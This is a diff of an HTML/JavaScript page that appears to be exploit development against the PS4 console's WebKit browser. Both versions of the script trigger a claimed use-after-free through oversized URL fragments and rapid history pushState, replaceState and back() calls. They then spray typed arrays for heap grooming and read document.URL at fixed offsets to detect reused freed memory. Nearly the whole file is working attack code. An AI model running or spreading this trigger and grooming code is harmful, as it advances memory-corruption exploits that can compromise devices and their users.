@@ -2,18 +2,18 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Fragment → TypedArray Slot Probe</title>
+<title>PS4 WebKit – Slot Offset & TypedArray Mapping</title>
 <style>
 body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
-button { font-size:16px; padding:10px; margin:5px; }
-#log { white-space:pre-wrap; border:1px solid #0f0; padding:10px; margin-top:10px; max-height:70vh; overflow:auto; }
+button { padding:10px; margin:5px; font-size:14px; }
+#log { white-space:pre-wrap; margin-top:15px; max-height:500px; overflow:auto; }
 </style>
 </head>
 
 <body>
-<h2>PS4 WebKit – UAF ⇄ TypedArray Intersection Test</h2>
+<h2>Slot Offset & TypedArray Mapping (Diagnostic)</h2>
 
-<button onclick="runTest()">RUN TEST</button>
+<button onclick="runTest()">RUN MAPPING TEST</button>
 
 <div id="log"></div>
 
@@ -22,92 +22,86 @@ const logEl = document.getElementById("log");
 function log(m){ logEl.textContent += m + "\n"; }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-// =================================================
-// CONFIG (do not change)
-// =================================================
+// -------------------------------------------------
+// CONFIG (known-good values)
+// -------------------------------------------------
 const BASE = 977;
 const STEP = 14461;
-const ITERS = 48;
+const UAF_ITERS = 48;
 
-// =================================================
-// CORE TEST
-// =================================================
+// -------------------------------------------------
+// UAF TRIGGER (validated)
+// -------------------------------------------------
+async function triggerUAF(){
+    let size = BASE;
+    for(let i=0;i<UAF_ITERS;i++){
+        let frag = "A".repeat(size);
+        history.pushState({}, "", "#"+frag);
+        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
+        if(i % 6 === 0)
+            setTimeout(()=>history.back(),0);
+        size += STEP;
+        await sleep(5);
+    }
+    log(">>> UAF WINDOW <<<");
+    await sleep(120);
+}
+
+// -------------------------------------------------
+// SAFE READ WINDOW
+// -------------------------------------------------
+function snapshot(label){
+    log(`[${label}] URL.length = ${document.URL.length}`);
+    const offs = [0,32,64,96,128,256,512,1024];
+    for(const o of offs){
+        let v = document.URL.charCodeAt(o);
+        log(`[${label}] charCodeAt(${o}) = ${v}`);
+    }
+}
+
+// -------------------------------------------------
+// MAIN TEST
+// -------------------------------------------------
 async function runTest(){
-  logEl.textContent = "";
-  log("=== TEST START ===");
+    logEl.textContent = "";
+    log("=== TEST START ===");
 
-  let size = BASE;
+    await triggerUAF();
 
-  // -------------------------------
-  // Phase 1 – Proven UAF Trigger
-  // -------------------------------
-  log("=== UAF TRIGGER START ===");
-  for(let i=0;i<ITERS;i++){
-    let frag = "A".repeat(size);
-    history.pushState({}, "", "#"+frag);
-    history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
+    // Baseline
+    snapshot("BASELINE");
 
-    if(i % 6 === 0){
-      setTimeout(()=>history.back(),0);
-      log(`[ITER ${i}] back() async`);
+    // Collapse fragment
+    location.hash = "#B";
+    await sleep(50);
+    log(">>> FRAGMENT COLLAPSED <<<");
+    snapshot("POST-COLLAPSE");
+
+    // TypedArray candidates
+    const candidates = [
+        {name:"Uint8Array", ctor:Uint8Array},
+        {name:"Uint16Array", ctor:Uint16Array},
+        {name:"Uint32Array", ctor:Uint32Array},
+        {name:"Float64Array", ctor:Float64Array},
+    ];
+
+    for(const c of candidates){
+        log(`\n=== TESTING ${c.name} ===`);
+
+        let arrs = [];
+        for(let i=0;i<2000;i++){
+            arrs.push(new c.ctor(0x20)); // slot-sized candidate
+        }
+
+        await sleep(30);
+        snapshot(c.name);
+
+        // keep arrays alive briefly
+        await sleep(30);
+        arrs = null;
     }
 
-    size += STEP;
-    await sleep(5);
-  }
-
-  log(">>> UAF WINDOW <<<");
-  await sleep(120);
-
-  // -------------------------------
-  // Baseline snapshot
-  // -------------------------------
-  const url = document.URL;
-  log("[BASE] URL.length = " + url.length);
-
-  const offsets = [64,128,256,512,1024];
-  for(const o of offsets){
-    log(`[BASE] charCodeAt(${o}) = ${url.charCodeAt(o)}`);
-  }
-
-  // -------------------------------
-  // Phase 2 – Force fragment collapse
-  // -------------------------------
-  location.hash = "#B";
-  await sleep(10);
-
-  log(">>> FRAGMENT COLLAPSED (hash small) <<<");
-
-  // -------------------------------
-  // Phase 3 – Targeted heap grooming
-  // -------------------------------
-  log(">>> ALLOCATING TYPED ARRAYS <<<");
-
-  let buffers = [];
-  let views = [];
-
-  for(let i=0;i<2000;i++){
-    let ab = new ArrayBuffer(0x20); // 32 bytes
-    let ta = new Uint32Array(ab);
-    ta[0] = 0x41414141;
-    buffers.push(ab);
-    views.push(ta);
-  }
-
-  await sleep(20);
-
-  // -------------------------------
-  // Phase 4 – Re-read URL backing
-  // -------------------------------
-  log(">>> POST-GROOM READ <<<");
-  log("[AFTER] URL.length = " + document.URL.length);
-
-  for(const o of offsets){
-    log(`[AFTER] charCodeAt(${o}) = ${document.URL.charCodeAt(o)}`);
-  }
-
-  log("history.length = " + history.length);
-  log("=== TEST END ===");
+    log("\n=== TEST END ===");
 }
 </script>
 </body>
